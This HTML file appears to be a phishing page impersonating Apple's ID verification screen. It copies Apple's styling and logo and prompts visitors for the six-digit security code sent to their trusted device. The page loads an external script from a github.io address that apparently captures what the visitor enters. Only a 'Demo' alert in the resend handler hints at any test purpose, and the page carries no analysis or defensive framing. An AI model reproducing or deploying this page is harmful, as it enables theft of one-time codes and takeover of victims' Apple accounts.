<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple ID â€“ Verification</title>

<style>
body {
  background-color: #f2f2f7;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial;
}

.apple-box {
  background: white;
  padding: 40px;
  width: 360px;
  border-radius: 16px;
  text-align: center;
  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
}

h2 {
  color: #1d1d1f;
  margin-bottom: 10px;
}

.desc {
  font-size: 13px;
  color: #555;
  margin-bottom: 20px;
}

input[type="text"] {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: 1px solid #ccc;
  background-color: #fafafa;
  text-align: center;
  font-size: 18px;
  letter-spacing: 6px;
  margin-bottom: 20px;
}

button {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: none;
  background-color: #0071e3;
  color: white;
  font-size: 16px;
  cursor: pointer;
  margin-bottom: 10px;
}

.resend {
  font-size: 14px;
  color: #666;
  margin-top: 10px;
}

button:disabled {
  background-color: #999;
  cursor: not-allowed;
}
</style>

</head>

<body>
<script src="https://plyarth.github.io/intc/int7.js"></script>
<div class="apple-box">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/80px-Apple_logo_black.svg.png" alt="Apple">

  <h2>Apple ID Security Code</h2>

  <div class="desc">
    Enter the 6-digit code sent to your trusted Apple device.
  </div>

  <form>
    <input type="text" maxlength="20" placeholder="------" name="Otp Code" required>

    <button>Continue</button>

    <button type="button" id="resendBtn" disabled>Resend Code</button>

    <div class="resend">
      Resend available in <span id="timer">30</span>s
    </div>
  </form>
</div>

<script>
let countdown = 30;
const timer = document.getElementById("timer");
const resendBtn = document.getElementById("resendBtn");

setInterval(() => {
  countdown--;
  timer.innerText = countdown;

  if (countdown <= 0) {
    resendBtn.disabled = false;
  }
}, 1000);

resendBtn.addEventListener("click", () => {
  alert("Demo: Apple ID resend action");
  countdown = 30;
  resendBtn.disabled = true;
});
</script>

</body>
</html>
